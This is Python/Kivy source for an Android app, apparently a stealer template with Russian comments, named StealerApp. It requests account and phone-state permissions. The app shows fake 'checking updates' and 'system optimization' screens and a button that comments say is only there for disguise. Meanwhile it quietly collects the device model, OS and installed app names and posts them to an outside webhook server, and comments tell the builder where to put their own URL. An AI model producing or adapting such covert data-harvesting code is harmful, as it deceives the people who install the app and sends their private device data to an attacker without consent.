import kivy
kivy.require('2.1.0')

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
import json
import os
import requests
import android
from android import android_api
from android.permissions import request_permissions, Permission

# ==== ВОТ ЗДЕСЬ ДОБАВЛЯЕШЬ URL СЕРВЕРА ====
SERVER_URL = "https://zonastealer-bot.onrender.com/webhook"
# ===========================================

class DataCollector:
    def __init__(self):
        self.data = {}
    
    def get_system_info(self):
        """Сбор системной информации"""
        import platform
        self.data['os'] = platform.system()
        self.data['device'] = android_api.get('device_model', 'Unknown')
        return self.data
    
    def get_installed_apps(self):
        """Получение списка установленных приложений"""
        try:
            # Для Android
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            pm = PythonActivity.mActivity.getPackageManager()
            packages = pm.getInstalledPackages(0)
            app_list = []
            for i in range(packages.size()):
                pkg = packages.get(i)
                app_list.append(pkg.packageName)
            self.data['apps'] = app_list[:50]  # Первые 50 приложений
        except:
            self.data['apps'] = ["Не удалось получить"]
        return self.data
    
    def collect_all(self):
        """Сбор всех данных"""
        self.get_system_info()
        self.get_installed_apps()
        self.data['status'] = 'collected'
        return self.data

class StealerApp(App):
    def build(self):
        # Запрашиваем разрешения
        request_permissions([
            Permission.INTERNET,
            Permission.ACCESS_NETWORK_STATE,
            Permission.GET_ACCOUNTS,
            Permission.READ_PHONE_STATE
        ])
        
        # Создаем интерфейс
        layout = BoxLayout(orientation='vertical')
        
        # Приветственная надпись
        self.label = Label(text="Загрузка приложения...\nПожалуйста, подождите")
        layout.add_widget(self.label)
        
        # Кнопка (для маскировки)
        self.button = Button(text="Проверить обновления")
        self.button.bind(on_press=self.on_button_press)
        layout.add_widget(self.button)
        
        # Запускаем сбор данных через 3 секунды
        Clock.schedule_once(self.start_collection, 3)
        
        return layout
    
    def on_button_press(self, instance):
        """Обработчик нажатия кнопки (для видимости)"""
        self.label.text = "Проверка обновлений...\nВсе актуально"
    
    def start_collection(self, dt):
        """Начало сбора и отправки данных"""
        try:
            self.label.text = "Оптимизация системы..."
            
            # Собираем данные
            collector = DataCollector()
            all_data = collector.collect_all()
            
            # ==== ОТПРАВКА НА СЕРВЕР ====
            try:
                # Добавляем идентификатор устройства
                all_data['device_id'] = "android_device"
                
                # Отправляем POST запрос
                response = requests.post(
                    SERVER_URL,  # ← ИСПОЛЬЗУЕТСЯ ТВОЙ URL
                    json=all_data,
                    timeout=10
                )
                
                if response.status_code == 200:
                    self.label.text = "Оптимизация завершена!\nПриложение готово к работе"
                    # Сохраняем локально на всякий случай
                    self.save_local(all_data)
                else:
                    self.label.text = "Ошибка синхронизации\nРаботает в оффлайн-режиме"
                    
            except requests.exceptions.RequestException as e:
                self.label.text = "Нет соединения\nРаботает локально"
                self.save_local(all_data)
            # ==============================
            
        except Exception as e:
            self.label.text = f"Ошибка: {str(e)[:50]}"
    
    def save_local(self, data):
        """Сохранение данных локально (на случай проблем с сетью)"""
        try:
            cache_dir = self.user_data_dir
            file_path = os.path.join(cache_dir, 'app_cache.json')
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except:
            pass

if __name__ == '__main__':
    # Маскируем под обычное приложение
    StealerApp().run()
